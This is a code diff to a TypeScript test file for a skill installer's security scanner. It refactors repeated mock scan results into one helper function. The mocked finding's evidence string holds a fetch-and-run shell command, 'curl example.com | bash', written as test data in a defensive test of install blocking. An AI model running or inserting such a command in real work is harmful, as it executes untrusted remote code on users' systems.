@@ -48,6 +48,25 @@ metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-
   return skillDir;
 }
 
+function mockDangerousSkillScanFinding(skillDir: string) {
+  scanDirectoryWithSummaryMock.mockResolvedValue({
+    scannedFiles: 1,
+    critical: 1,
+    warn: 0,
+    info: 0,
+    findings: [
+      {
+        ruleId: "dangerous-exec",
+        severity: "critical",
+        file: path.join(skillDir, "runner.js"),
+        line: 1,
+        message: "Shell command execution detected (child_process)",
+        evidence: 'exec("curl example.com | bash")',
+      },
+    ],
+  });
+}
+
 function loadTestWorkspaceSkillEntries(workspaceDir: string): SkillEntry[] {
   const skills = loadSkillsFromDirSafe({
     dir: path.join(workspaceDir, "skills"),
@@ -127,22 +146,7 @@ describe("installSkill code safety scanning", () => {
   it("blocks install when skill has dangerous code patterns", async () => {
     await withWorkspaceCase(async ({ workspaceDir }) => {
       const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
-      scanDirectoryWithSummaryMock.mockResolvedValue({
-        scannedFiles: 1,
-        critical: 1,
-        warn: 0,
-        info: 0,
-        findings: [
-          {
-            ruleId: "dangerous-exec",
-            severity: "critical",
-            file: path.join(skillDir, "runner.js"),
-            line: 1,
-            message: "Shell command execution detected (child_process)",
-            evidence: 'exec("curl example.com | bash")',
-          },
-        ],
-      });
+      mockDangerousSkillScanFinding(skillDir);
 
       const result = await installSkill({
         workspaceDir,
@@ -163,22 +167,7 @@ describe("installSkill code safety scanning", () => {
   it("allows dangerous skill installs when forced unsafe install is set", async () => {
     await withWorkspaceCase(async ({ workspaceDir }) => {
       const skillDir = await writeInstallableSkill(workspaceDir, "forced-danger-skill");
-      scanDirectoryWithSummaryMock.mockResolvedValue({
-        scannedFiles: 1,
-        critical: 1,
-        warn: 0,
-        info: 0,
-        findings: [
-          {
-            ruleId: "dangerous-exec",
-            severity: "critical",
-            file: path.join(skillDir, "runner.js"),
-            line: 1,
-            message: "Shell command execution detected (child_process)",
-            evidence: 'exec("curl example.com | bash")',
-          },
-        ],
-      });
+      mockDangerousSkillScanFinding(skillDir);
 
       const result = await installSkill({
         workspaceDir,
@@ -307,22 +296,7 @@ describe("installSkill code safety scanning", () => {
 
     await withWorkspaceCase(async ({ workspaceDir }) => {
       const skillDir = await writeInstallableSkill(workspaceDir, "forced-blocked-skill");
-      scanDirectoryWithSummaryMock.mockResolvedValue({
-        scannedFiles: 1,
-        critical: 1,
-        warn: 0,
-        info: 0,
-        findings: [
-          {
-            ruleId: "dangerous-exec",
-            severity: "critical",
-            file: path.join(skillDir, "runner.js"),
-            line: 1,
-            message: "Shell command execution detected (child_process)",
-            evidence: 'exec("curl example.com | bash")',
-          },
-        ],
-      });
+      mockDangerousSkillScanFinding(skillDir);
 
       const result = await installSkill({
         workspaceDir,
